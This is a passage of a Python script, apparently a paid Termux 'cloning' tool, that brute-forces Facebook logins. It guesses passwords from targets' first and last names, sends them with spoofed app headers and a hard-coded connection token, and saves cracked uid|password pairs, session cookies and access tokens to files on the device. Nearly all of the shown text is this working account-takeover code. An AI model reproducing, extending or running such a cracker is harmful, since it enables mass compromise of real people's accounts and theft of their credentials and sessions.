...
╚══════╝░╚════╝░╚═╝░░╚═╝░╚════╝░                                                                
\33[1;36m---------------------------------------------------
\33[1;32m [\033[1;36m>●<\033[1;32m] WRITTEN     :  \33[1;36m [\033[1;32m>●<\033[1;36m] \033[1;36mZORO DONA
\33[1;92m [\033[1;36m>●<\033[1;32m] FACEBOOK    :  \33[1;36m [\033[1;32m>●<\033[1;36m] \033[1;36mZO RO
\33[1;32m [\033[1;36m>●<\033[1;32m] GITHUB      :  \33[1;36m [\033[1;32m>●<\033[1;36m] \033[1;36mEMPTYCYBER404
\33[1;32m [\033[1;36m>●<\033[1;32m] STATUS      :  \33[1;36m [\033[1;32m>●<\033[1;36m] \033[1;36mACTIVE
\33[1;32m [\033[1;36m>●<\033[1;32m] TYPE        :  \33[1;36m [\033[1;32m>●<\033[1;36m] \033[1;36mPAID
\33[1;32m [\033[1;36m>●<\033[1;32m] VERSION     :  \33[1;36m [\033[1;32m>●<\033[1;36m] \033[1;36m4
\33[1;32m--------------------------------------------------''')
	p(logo)
def clear():
	os.system("clear")
...
class iAmMain:
	...
	def iAmMenu(self):
		...
		p(" \33[1;36m [\033[1;32m>SELECT<\033[1;36m] \033[1;36m[1] File Cloning ")
		p(" \33[1;36m [\033[1;32m>SELECT<\033[1;36m] \033[1;36m[2] Random Cloning ")
		p(" \33[1;36m [\033[1;32m>SELECT<\033[1;36m] \033[1;91m[100] Exit Tool ")
		line()
		opt1 = input(" \33[1;36m [\033[1;32m>●<\033[1;36m] \033[1;36m \033[1;32m Select An Option : ")
		if opt1 == "1":self.file_menu()
		
		elif opt1 == "2":self.num_menu()
		elif opt1 == "4":automation().menu()
		elif opt1 == "3":Grep().links_only()
		elif opt1 == "100":exit(" [•] PROCESS THE END")
	...
	def password_menu(self,id):
		...
		try:
			...
			plimit = 4
		logo()
		p(" [•] EXAMPLE : first last First Last etc ")
		line()
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;91m[RATEY-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/RATEY_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [RATEY] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					token = q["access_token"]
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[RATEY-OK] %s | %s \033[1;97m '%(uid,pw))
					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					open('/sdcard/RATEY_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RATEY_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[RATEY-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/RATEY_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [RATEY %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[RATEY-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/RATEY_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RATEY_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[RATEY-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/RATEY_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		...
		try:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[RATEY-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/RATEY_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RATEY_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[RATEY-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/RATEY_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def r_crack(self,uid,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [RATEY] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			for pw in pwx:
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[RATEY-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/RATEY_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RATEY_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[RATEY-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/RATEY_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
